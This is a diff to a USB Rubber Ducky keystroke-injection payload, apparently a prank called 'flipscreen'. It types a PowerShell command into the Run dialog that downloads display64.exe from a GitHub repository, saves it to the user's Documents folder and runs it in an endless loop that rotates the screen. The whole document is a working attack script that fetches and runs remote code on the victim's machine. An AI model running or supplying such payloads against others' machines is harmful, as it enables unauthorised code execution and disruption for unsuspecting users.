@@ -1,5 +1,5 @@
 GUI r
 DELAY 100
-STRING powershell Invoke-WebRequest -Uri 'https://github.com/chaos511/DuckyPayloads/raw/master/flipscreen/programs/display64.exe';while($true){For ($i=0; $i -le 270; $i+=90) {display64.exe /rotate:$i;Start-Sleep -s 1;}}
+STRING powershell Invoke-WebRequest -Uri 'https://github.com/chaos511/DuckyPayloads/raw/master/flipscreen/programs/display64.exe' -OutFile C:/Users/$env:UserName/Documents/display64.exe ;while($true){For ($i=0; $i -le 270; $i+=90) {& "C:/Users/$env:UserName/Documents/display64.exe" /rotate:$i;Start-Sleep -s 1;}}
 DELAY 10
 ENTER
